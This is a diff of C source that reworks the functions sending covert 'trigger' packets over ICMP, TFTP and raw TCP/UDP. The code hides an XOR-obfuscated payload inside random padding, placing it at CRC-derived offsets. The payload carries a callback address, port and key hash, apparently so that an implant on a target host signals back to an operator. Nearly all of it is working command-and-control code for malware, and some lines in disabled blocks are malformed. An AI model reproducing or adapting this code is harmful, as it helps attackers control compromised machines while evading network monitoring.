@@ -205,15 +205,18 @@ trigger_icmp_error (payload * p, trigger_info * ti)
  * The payload has already been initialized with random data, so use the first
  * byte as the seed by which the rest are XORd.
  *
+ * NOTE: obfuscate_payload is only needed for triggers such as icmp_ping. Raw
+ * triggers are already obfuscated.
+ *
  */
 static void
-obfuscate_payload (payload *p, uint8_t * return_buffer)
+obfuscate_payload (payload *p, uint8_t *return_buffer)
 {
 	int i;
 	uint8_t *package;
 
 	package = (uint8_t *)p;
-	if (p->seed == 0)	// Make sure seed is not zero, otherwise payload doesn't get obfuscated.
+	if (p->seed == 0)		// Make sure seed is not zero, otherwise payload doesn't get obfuscated.
 		p->seed = 0xFF;
 
 	return_buffer[0] = p->seed;
@@ -221,6 +224,7 @@ obfuscate_payload (payload *p, uint8_t * return_buffer)
 		return_buffer[i] = package[i] ^ p->seed;	//Obfuscate payload by XORing it with seed byte
 	}
 }
+
 
 /*!
  * trigger_icmp_ping
@@ -258,19 +262,15 @@ trigger_icmp_ping (payload * p, trigger_info * ti)
 
 #ifdef DEBUG
 	{
-		int i;
+		size_t i;
 
 		info ("Pre-obfuscation");
 		info ("Seed: %2.2X", p->seed);
-		printf ("  Package: ");
-		for (i = 0; i < 9; i++) {
-			printf ("%2.2X ", (p->package)[i]);
+		printf ("  Payload: ");
+		for (i = 0; i < sizeof(payload); i++) {
+			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
 		printf ("  CRC: 0x%4.4X\n", p->crc);
-		info ("RAW BYTES:");
-		for (i = 0; i < sizeof (payload); i++) {
-			printf ("0x%2.2X ", ((uint8_t *) p)[i]);
-		}
 		printf ("\n");
 	}
 #endif
@@ -460,21 +460,18 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 	uint8_t *tftp_data;
 	size_t data_size;
 
+
 #ifdef DEBUG
 	{
-		int i;
+		size_t i;
 
 		info ("Pre-obfuscation");
 		info ("Seed: %2.2X", p->seed);
-		printf ("  Package: ");
-		for (i = 0; i < 9; i++) {
-			printf ("%2.2X ", (p->package)[i]);
+		printf ("  Payload: ");
+		for (i = 0; i < sizeof(payload); i++) {
+			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
 		printf ("  CRC: 0x%4.4X\n", p->crc);
-		info ("RAW BYTES:");
-		for (i = 0; i < sizeof (payload); i++) {
-			printf ("0x%2.2X ", ((uint8_t *) p)[i]);
-		}
 		printf ("\n");
 	}
 #endif
@@ -492,7 +489,7 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 
 		info ("Post-obfuscation\n");
 		info ("RAW BYTES: ");
-		for (i = 0; i < sizeof (obf_payload_buf); i++) {
+		for (i = 0; i < sizeof(obf_payload_buf); i++) {
 			printf ("%2.2X ", ((uint8_t *) obf_payload_buf)[i]);
 		}
 		printf ("\n");
@@ -820,8 +817,9 @@ trigger_icmp_dest_unreachable (payload * p, trigger_info * ti)
 	return SUCCESS;
 }
 
+#if 0
 int
-trigger_raw_udp (payload * p, trigger_info * ti)
+trigger_raw_udp (payload *p, trigger_info *ti)
 {
 	in_addr_t s_addr;
 	in_addr_t d_addr;
@@ -847,8 +845,8 @@ trigger_raw_udp (payload * p, trigger_info * ti)
 	D (printf ("%s, %4d: Sending UDP trigger to port %d\n", __FILE__, __LINE__, ti->trigger_port); )
 
 	//now set up raw data
-	obfuscate_payload(p, obf_payload_buf);
-	data_size = formRawPacketData (raw_data, (payload *)obf_payload_buf);
+//	obfuscate_payload(p, obf_payload_buf);
+	data_size = formRawPacketData(raw_data, (payload *)p);
 
 	send_UDP_data (s_addr, d_addr, s_port, d_port, raw_data, data_size);
 
@@ -860,16 +858,15 @@ trigger_raw_udp (payload * p, trigger_info * ti)
 }
 
 int
-trigger_raw_tcp (payload * p, trigger_info * ti)
+trigger_raw_tcp (payload *p, trigger_info * ti)
 {
-	in_addr_t s_addr;
-	in_addr_t d_addr;
-	uint16_t s_port;
-	uint16_t d_port;
-	uint8_t *raw_data;
-	uint8_t obf_payload_buf[sizeof (payload)];
-	unsigned int data_size;
-	int rv;
+	in_addr_t	s_addr;
+	in_addr_t	d_addr;
+	uint16_t	s_port;
+	uint16_t	d_port;
+	uint8_t		*raw_data;
+	unsigned int	data_size;
+	int		rv;
 
 	D (printf ("%s, %4d: DEBUG: raw_tcp\n", __FILE__, __LINE__); )
 
@@ -881,12 +878,17 @@ trigger_raw_tcp (payload * p, trigger_info * ti)
 	//now add in trigger dst, the target ip
 	d_addr = ti->target_addr;
 	s_addr = INADDR_ANY;	// system will set to true IP
-	s_port = randShort ();
+	s_port = randShort();
 	d_port = htons (ti->trigger_port);
 	D (printf ("%s, %4d: Sending TCP trigger to port %d\n", __FILE__, __LINE__, ti->trigger_port); )
 
-	obfuscate_payload(p, obf_payload_buf);
-	data_size = formRawPacketData (raw_data, (payload *)obf_payload_buf);
+	// Build payload
+	p->callback_addr = htonl(ti->callback_addr);
+	p->callback_port = htons(ti->callback_port);
+	memcpy(&(p->idKey_hash)), &(ti->idKey_hash), ID_KEY_HASH_SIZE;
+	p->crc = htons(tiny_crc16(p, sizeof(p)-2));
+
+	data_size = formRawPacketData(raw_data, p);
 
 	rv = send_TCP_data (s_addr, d_addr, s_port, d_port, raw_data, data_size);
 
@@ -900,51 +902,81 @@ trigger_raw_tcp (payload * p, trigger_info * ti)
 
 	return SUCCESS;
 }
-
+#endif
 /*!
- * formRawPacketData
- * @param data	- The data packet that will be sent.
+ * trigger_raw
  * @param p	- The location of the payload to be sent.
- * @return
- * @retval Packet_Length
+ * @param ti	- Trigger info
+ * @return SUCCESS or FAILURE
  */
 unsigned int
-formRawPacketData (uint8_t * data, payload * p)
+trigger_raw (payload *p, trigger_info *ti)
 {
-	uint16_t crc = 0;
-	uint16_t crc_net;
-	void *fieldPtr;			// Packet field pointer
-	uint8_t *payloadKeyIndex;
+	uint16_t	crc = 0;
+	uint16_t	crc_net;
+	void		*fieldPtr;		// Packet field pointer
+	uint8_t		*payloadKeyIndex;
+	uint8_t		*packet;
+	size_t		packet_size;
 
-	uint16_t validator;		// An integer divisible by 127
-	uint16_t validator_net;
-	int i;				// Loop counter
+	in_addr_t	s_addr;
+	in_addr_t	d_addr;
+	uint16_t	s_port;
+	uint16_t	d_port;
+
+	uint16_t	validator;		// An integer divisible by 127
+	uint16_t	validator_net;
+	int i;					// Loop counter
+	int		rv;
+
+	D (printf ("%s, %4d: DEBUG: raw_tcp\n", __FILE__, __LINE__); )
+
+	if ((packet = (uint8_t *) calloc (MAX_PACKET_SIZE, 1)) == NULL) {
+		perror (" calloc()");	// calloc() memory allocation failed
+		exit (-1);
+	}
+
+	//now add in trigger dst, the target ip
+	d_addr = ti->target_addr;
+	s_addr = INADDR_ANY;	// system will set to true IP
+	s_port = randShort();
+	d_port = htons (ti->trigger_port);
+	D (printf ("%s, %4d: Sending TCP trigger to port %d\n", __FILE__, __LINE__, ti->trigger_port); )
+
+#if 0	// This code not needed, already done in trigger.c by call to trigger_info_to_payload.
+	// Build payload
+	p->callback_addr = htonl(ti->callback_addr);
+	p->callback_port = htons(ti->callback_port);
+	memcpy(&(p->idKey_hash)), &(ti->idKey_hash), ID_KEY_HASH_SIZE;
+	p->crc = 0;
+	p->crc = htons(tiny_crc16(p, sizeof(p)));
+#endif
 
 	// Fill maximum packet size with random data
 	for (i = 0; i < MAX_PACKET_SIZE; i++) {
-		data[i] = randChar();
+		packet[i] = randChar();
 	}
 
 	// Compute the checksum of the CRC Data Field that follows the START_PAD.
-	crc = tiny_crc16 ((unsigned char *) ((char *) data + START_PAD), CRC_DATA_LENGTH);
+	crc = tiny_crc16 ((unsigned char *) ((char *) packet + START_PAD), CRC_DATA_LENGTH);
 	crc_net = htons(crc);
 
-	// Store the computed CRC at a location START_PAD + CRC_DATA_LENGTH + CRC % 200 into the packet.
-	fieldPtr = data + START_PAD + CRC_DATA_LENGTH + (crc % 200);	// Set field pointer
-	D (printf (" %s, %d:\tCRC offset: 0x%x, crc: 0x%0x, crc_net: 0x%0x\n", __FILE__, __LINE__, (uint8_t *)fieldPtr - data, crc, crc_net); )
+	// Store the computed CRC at a location START_PAD + CRC_DATA_LENGTH + CRC % RANDOM_PAD1 into the packet.
+	fieldPtr = packet + START_PAD + CRC_DATA_LENGTH + (crc % RANDOM_PAD1);	// Set field pointer
+	D (printf (" %s, %d:\tCRC offset: 0x%x, crc: 0x%0x, crc_net: 0x%0x\n", __FILE__, __LINE__, (uint8_t *)fieldPtr - packet, crc, crc_net); )
 	memcpy (fieldPtr, &crc_net, sizeof (crc_net));
 	fieldPtr += sizeof(crc_net);				// Jump field pointer to next field
 
 	// Create a validator integer divisible by 127 and store it at the field pointer location.
 	validator = (uint8_t)randChar() * 127;
 	validator_net = htons(validator);
-	D (printf (" %s, %d:\tvalidator offset: 0x%x, validator: 0x%x, validator_net: 0x%x\n", __FILE__, __LINE__, (uint8_t *)fieldPtr - data, validator, validator_net); )
+	D (printf (" %s, %d:\tvalidator offset: 0x%x, validator: 0x%x, validator_net: 0x%x\n", __FILE__, __LINE__, (uint8_t *)fieldPtr - packet, validator, validator_net); )
 	memcpy(fieldPtr, &validator_net, sizeof(validator_net));
 
 	// Encode the payload by XORing it with random data starting at a location within the random data used to generate the CRC.
-	fieldPtr += sizeof(validator_net) + PAD1_LENGTH;			// Update the field pointer to the payload location.
-	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(payload))));	// Compute the start of the payload key
-	D (printf (" %s, %d:\tEncoded trigger offset: 0x%0x, payload key offset: 0x%0x\tTrigger follows\n", __FILE__, __LINE__, (uint8_t *)fieldPtr-data, payloadKeyIndex-data); )
+	fieldPtr += sizeof(validator_net) + PAD1;			// Update the field pointer to the payload location.
+	payloadKeyIndex = (uint8_t *)(packet + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(payload))));	// Compute the start of the payload key
+	D (printf (" %s, %d:\tEncoded trigger offset: 0x%0x, payload key offset: 0x%0x\tTrigger follows\n", __FILE__, __LINE__, (uint8_t *)fieldPtr-packet, payloadKeyIndex-packet); )
 
 	for (i = 0; i < (int)sizeof(payload); i++) {
 		uint8_t trigger;
@@ -953,7 +985,32 @@ formRawPacketData (uint8_t * data, payload * p)
 		memcpy(fieldPtr + i, &trigger, sizeof(uint8_t));
 	}
 
-	fieldPtr += sizeof(payload) + PAD2_LENGTH;
-	D (printf ("\n %s, %d:\tPacket Length: %d\n", __FILE__, __LINE__,(unsigned int)fieldPtr - (unsigned int)data + (unsigned int)(crc % 146) ); )
-	return ( (unsigned int)fieldPtr - (unsigned int)data + (unsigned int)(crc % 146) );	// Return the total length of the packet, including a randomized padding length.
+	fieldPtr += sizeof(payload) + PAD2;
+	D (printf ("\n %s, %d:\tPacket Length: %d\n", __FILE__, __LINE__,(unsigned int)fieldPtr - (unsigned int)packet + (unsigned int)(crc % RANDOM_PAD2) ); )
+	packet_size = (unsigned int)fieldPtr - (unsigned int)packet + (unsigned int)(crc % RANDOM_PAD2);	// Total length of the packet, including a randomized padding length.
+
+	switch (ti->trigger_type) {
+
+	case T_RAW_TCP:
+		rv = send_TCP_data (s_addr, d_addr, s_port, d_port, packet, packet_size);
+		break;
+
+	case T_RAW_UDP:
+		rv = send_UDP_data (s_addr, d_addr, s_port, d_port, packet, packet_size);
+		break;
+
+	default:
+		rv = -1;
+		break;
+	}
+
+	// free the packet
+	if (packet != NULL)
+		free (packet);
+	packet = NULL;
+
+	if (rv == -1)
+		return FAILURE;
+
+	return SUCCESS;
 }
